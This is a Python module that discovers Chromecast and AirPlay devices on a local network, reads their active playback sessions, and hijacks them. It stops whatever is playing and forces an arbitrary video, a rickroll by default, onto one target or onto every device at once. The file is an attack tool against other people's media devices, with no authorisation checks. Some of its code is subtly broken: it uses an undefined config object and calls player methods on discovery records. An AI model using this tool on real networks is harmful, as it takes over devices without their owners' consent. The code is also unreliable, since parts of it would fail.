import socket
import json
import time
import requests
from typing import List, Dict, Any, Optional
from zeroconf import Zeroconf, ServiceBrowser, ServiceListener
import pychromecast
from pychromecast.controllers.media import MediaController
from pychromecast.error import ChromecastConnectionError
import pyatv
import asyncio
from datetime import datetime, timedelta
import aiohttp
from urllib.parse import urlparse
import logging
import sys

# Configure logging
logger = logging.getLogger(__name__)
handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
logger.addHandler(handler)

# Default rickroll video URL
DEFAULT_VIDEO_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

# Rate limiting settings
MAX_ATTEMPTS_PER_DEVICE = 3
RATE_LIMIT_WINDOW = 60  # seconds
RETRY_DELAY = 5  # seconds
CONNECTION_TIMEOUT = 10  # seconds

class CastModule:
    """
    Cast session detection and hijacking for Chromecast and AirPlay devices.
    """
    def __init__(self, timeout: int = 5, debug: bool = False):
        self.timeout = timeout
        self.debug = debug
        if debug:
            logger.setLevel(logging.DEBUG)
        else:
            logger.setLevel(logging.INFO)
        self.devices: List[Dict[str, Any]] = []
        self.chromecasts = []
        self.airplay_devices = []
        self.zeroconf = Zeroconf()
        self.device_attempts = {}
        self.session = None
        logger.debug("CastModule initialized with timeout=%d, debug=%s", timeout, debug)

    async def _get_session(self):
        """Get or create aiohttp session with connection pooling"""
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=CONNECTION_TIMEOUT),
                connector=aiohttp.TCPConnector(limit=10)
            )
            logger.debug("Created new aiohttp session")
        return self.session

    def _check_rate_limit(self, device_id: str) -> bool:
        """
        Check if device has exceeded rate limit
        Returns True if allowed, False if rate limited
        """
        now = datetime.now()
        if device_id not in self.device_attempts:
            self.device_attempts[device_id] = []
        
        # Clean up old attempts
        self.device_attempts[device_id] = [
            attempt for attempt in self.device_attempts[device_id]
            if attempt > now - timedelta(seconds=RATE_LIMIT_WINDOW)
        ]
        
        if len(self.device_attempts[device_id]) >= MAX_ATTEMPTS_PER_DEVICE:
            logger.warning("Rate limit exceeded for device %s", device_id)
            return False
            
        self.device_attempts[device_id].append(now)
        logger.debug("Rate limit check passed for device %s (attempts: %d)", 
                    device_id, len(self.device_attempts[device_id]))
        return True

    async def _detect_content_type(self, url: str) -> Optional[str]:
        """Detect content type of media URL"""
        try:
            session = await self._get_session()
            async with session.head(url, allow_redirects=True) as response:
                content_type = response.headers.get('content-type', '').lower()
                logger.debug("Detected content type %s for URL %s", content_type, url)
                
                # Check if it's a YouTube URL
                if 'youtube.com' in url or 'youtu.be' in url:
                    return 'video/youtube'
                    
                # Check if it's a supported content type
                if any(supported in content_type for supported in config.SUPPORTED_CONTENT_TYPES):
                    return content_type
                    
                logger.warning("Unsupported content type %s for URL %s", content_type, url)
                return None
        except Exception as e:
            logger.error("Error detecting content type: %s", str(e))
            return None

    async def _validate_media_url(self, url: str) -> bool:
        """Validate media URL is accessible and has supported content type"""
        try:
            content_type = await self._detect_content_type(url)
            if not content_type:
                logger.error(config.ERROR_MESSAGES['media_url_invalid'].format(url))
                return False
                
            session = await self._get_session()
            async with session.head(url, allow_redirects=True) as response:
                valid = response.status == 200
                if valid:
                    logger.debug("Media URL validation passed: %s (%s)", url, content_type)
                else:
                    logger.error("Media URL returned status %d: %s", response.status, url)
                return valid
        except Exception as e:
            logger.error("Error validating media URL: %s", str(e))
            return False

    async def discover_devices(self) -> List[Dict[str, Any]]:
        """
        Discover Chromecast and AirPlay devices on the network.
        """
        logger.info("Starting device discovery...")

        # Clear previous results
        self.devices = []
        self.chromecasts = []
        self.airplay_devices = []

        # Discover Chromecast devices using pychromecast
        try:
            services, browser = pychromecast.discovery.discover_chromecasts(timeout=self.timeout, zeroconf_instance=self.zeroconf)
            self.chromecasts = []
            
            # Add robust error handling for None properties
            for cast_info in services:
                try:
                    if not cast_info or not cast_info.cast_info:
                        logger.debug("Skipping invalid Chromecast service (None cast_info)")
                        continue
                    
                    cc = cast_info.cast_info
                    
                    # Validate required properties
                    if not all([cc.friendly_name, cc.host, cc.port]):
                        logger.debug("Skipping Chromecast with missing required properties: %s", 
                                   cc.host if cc.host else 'unknown host')
                        continue
                    
                    self.chromecasts.append(cc)
                    
                    device = {
                        'name': cc.friendly_name,
                        'address': cc.host,
                        'port': cc.port,
                        'type': 'chromecast',
                        'model': cc.model_name if cc.model_name else 'unknown',
                        'uuid': str(cc.uuid) if cc.uuid else 'unknown',
                        'cast_type': cc.cast_type if cc.cast_type else 'unknown',
                        'manufacturer': cc.manufacturer if cc.manufacturer else 'unknown'
                    }
                    self.devices.append(device)
                    logger.info("Found Chromecast: %s at %s", device['name'], device['address'])
                    
                except AttributeError as ae:
                    logger.error("Error processing Chromecast service properties: %s", str(ae))
                except Exception as e:
                    logger.error("Unexpected error processing Chromecast service: %s", str(e))
                
        except Exception as e:
            logger.error("Error discovering Chromecasts: %s", str(e))

        # Discover AirPlay devices with robust error handling
        try:
            adevs = await pyatv.scan(loop=asyncio.get_running_loop(), timeout=self.timeout)
            for dev in adevs:
                try:
                    # Validate required properties
                    if not dev or not dev.name or not dev.address:
                        logger.debug("Skipping AirPlay device with missing required properties")
                        continue
                    
                    device = {
                        'name': dev.name,
                        'address': str(dev.address),
                        'type': 'airplay',
                        'model': dev.model if dev.model else 'unknown',
                        'identifier': str(dev.identifier) if dev.identifier else 'unknown'
                    }
                    self.airplay_devices.append(dev)
                    self.devices.append(device)
                    logger.info("Found AirPlay device: %s at %s", device['name'], device['address'])
                    
                except AttributeError as ae:
                    logger.error("Error processing AirPlay device properties: %s", str(ae))
                except Exception as e:
                    logger.error("Unexpected error processing AirPlay device: %s", str(e))
                
        except Exception as e:
            logger.error("Error discovering AirPlay devices: %s", str(e))

        return self.devices

    async def detect_sessions(self) -> List[Dict[str, Any]]:
        """
        Detect active casting sessions on discovered devices.
        """
        sessions = []
        
        # Check Chromecast sessions
        for cc_info in self.chromecasts:
            try:
                chromecast = pychromecast.Chromecast(host=cc_info.host)
                chromecast.wait(timeout=self.timeout)
                
                if chromecast.media_controller.status:
                    session = {
                        'device_name': cc_info.friendly_name,
                        'device_type': 'chromecast',
                        'address': cc_info.host,
                        'status': chromecast.media_controller.status.player_state,
                        'app': chromecast.app_display_name,
                        'media_type': chromecast.media_controller.status.content_type if chromecast.media_controller.status.content_type else 'unknown',
                        'current_time': chromecast.media_controller.status.current_time if chromecast.media_controller.status.current_time else 0,
                        'duration': chromecast.media_controller.status.duration if chromecast.media_controller.status.duration else 0,
                        'volume': chromecast.status.volume_level if chromecast.status else 0
                    }
                    sessions.append(session)
                    logger.info("Found active Chromecast session on %s", session['device_name'])
                
                chromecast.disconnect()
            except Exception as e:
                logger.error("Error checking Chromecast session: %s", str(e))

        # Check AirPlay sessions
        for dev in self.airplay_devices:
            try:
                atv = await pyatv.connect(dev, asyncio.get_running_loop())
                if await atv.power.is_on:
                    playing = await atv.metadata.playing()
                    session = {
                        'device_name': dev.name,
                        'device_type': 'airplay',
                        'address': str(dev.address),
                        'status': 'playing' if playing.power_state == pyatv.const.PowerState.On else 'idle',
                        'app': playing.app,
                        'media_type': str(playing.media_type),
                        'current_time': playing.position,
                        'duration': playing.total_time,
                        'volume': playing.volume if playing.volume is not None else 0
                    }
                    sessions.append(session)
                    logger.info("Found active AirPlay session on %s", session['device_name'])
                await atv.close()
            except Exception as e:
                logger.error("Error checking AirPlay session: %s", str(e))

        return sessions

    async def hijack_session(self, target: str, video_url: str = None) -> bool:
        """
        Hijack a casting session on the specified target device.
        If no video_url is provided, defaults to Rick Astley - Never Gonna Give You Up
        """
        # Use default rickroll if no URL provided
        if not video_url:
            logger.info("No video URL provided, using default rickroll")
            video_url = DEFAULT_VIDEO_URL

        # Validate media URL and detect content type
        content_type = await self._detect_content_type(video_url)
        if not content_type:
            return False

        # Find target device
        target_device = None
        device_type = None
        
        for device in self.devices:
            if device['name'].lower() == target.lower() or device['address'] == target:
                target_device = device
                device_type = device['type']
                break
        
        if not target_device:
            logger.error("Target device '%s' not found", target)
            return False

        # Check rate limit
        device_id = f"{target_device['address']}:{target_device.get('port', '')}"
        if not self._check_rate_limit(device_id):
            logger.warning("Rate limit exceeded for %s. Please wait and try again.", target)
            return False

        attempts = 0
        while attempts < MAX_ATTEMPTS_PER_DEVICE:
            try:
                if device_type == 'chromecast':
                    # Find matching Chromecast
                    cc = None
                    for cast in self.chromecasts:
                        if cast.friendly_name == target_device['name']:
                            cc = cast
                            break
                    
                    if not cc:
                        logger.error("Could not connect to Chromecast '%s'", target)
                        return False

                    # Connect and hijack with timeout
                    async with asyncio.timeout(CONNECTION_TIMEOUT):
                        cc.wait()
                        mc = cc.media_controller
                        
                        # Stop current playback
                        mc.stop()
                        await asyncio.sleep(1)  # Give it time to stop
                        
                        # Start new media with detected content type
                        mc.play_media(video_url, content_type)
                        mc.block_until_active()
                        
                        logger.info("Successfully hijacked Chromecast session on %s", target)
                        return True

                elif device_type == 'airplay':
                    # Find matching AirPlay device
                    atv_device = None
                    for dev in self.airplay_devices:
                        if dev.name == target_device['name']:
                            atv_device = dev
                            break
                    
                    if not atv_device:
                        logger.error("Could not connect to AirPlay device '%s'", target)
                        return False

                    # Connect and hijack with timeout
                    async with asyncio.timeout(CONNECTION_TIMEOUT):
                        atv = await pyatv.connect(atv_device, asyncio.get_running_loop())
                        
                        # Stop current playback
                        await atv.remote_control.stop()
                        await asyncio.sleep(1)  # Give it time to stop
                        
                        # Start new media
                        await atv.stream.play_url(video_url)
                        
                        logger.info("Successfully hijacked AirPlay session on %s", target)
                        await atv.close()
                        return True

            except asyncio.TimeoutError:
                logger.warning("Connection timeout. Attempt %d/%d", attempts + 1, MAX_ATTEMPTS_PER_DEVICE)
            except Exception as e:
                logger.error("Error hijacking session: %s", e)
            
            attempts += 1
            if attempts < MAX_ATTEMPTS_PER_DEVICE:
                logger.info("Retrying in %d seconds...", RETRY_DELAY)
                await asyncio.sleep(RETRY_DELAY)

        logger.error("Failed to hijack session after %d attempts", MAX_ATTEMPTS_PER_DEVICE)
        return False

    async def broadcast_to_all(self, video_url: str = None) -> List[Dict[str, Any]]:
        """
        Broadcast video to all discovered cast-capable devices.
        If no video_url is provided, defaults to Rick Astley - Never Gonna Give You Up
        """
        # Use default rickroll if no URL provided
        if not video_url:
            logger.info("No video URL provided, using default rickroll")
            video_url = DEFAULT_VIDEO_URL

        results = []
        
        # Broadcast to Chromecasts
        for cc in self.chromecasts:
            try:
                cc.wait()
                mc = cc.media_controller
                mc.play_media(video_url, 'video/mp4')
                mc.block_until_active()
                results.append({
                    'device': cc.friendly_name,
                    'type': 'chromecast',
                    'status': 'success'
                })
            except Exception as e:
                results.append({
                    'device': cc.friendly_name,
                    'type': 'chromecast',
                    'status': 'failed',
                    'error': str(e)
                })

        # Broadcast to AirPlay devices
        for dev in self.airplay_devices:
            try:
                atv = await pyatv.connect(dev, asyncio.get_running_loop())
                await atv.stream.play_url(video_url)
                results.append({
                    'device': dev.name,
                    'type': 'airplay',
                    'status': 'success'
                })
                await atv.close()
            except Exception as e:
                results.append({
                    'device': dev.name,
                    'type': 'airplay',
                    'status': 'failed',
                    'error': str(e)
                })

        return results

    async def __aenter__(self):
        """Async context manager entry"""
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit - cleanup resources"""
        try:
            if self.session and not self.session.closed:
                await self.session.close()
        except:
            pass
        try:
            self.zeroconf.close()
        except:
            pass

    def __del__(self):
        """
        Clean up resources
        """
        try:
            if self.session and not self.session.closed:
                asyncio.create_task(self.session.close())
        except:
            pass
        try:
            self.zeroconf.close()
        except:
            pass 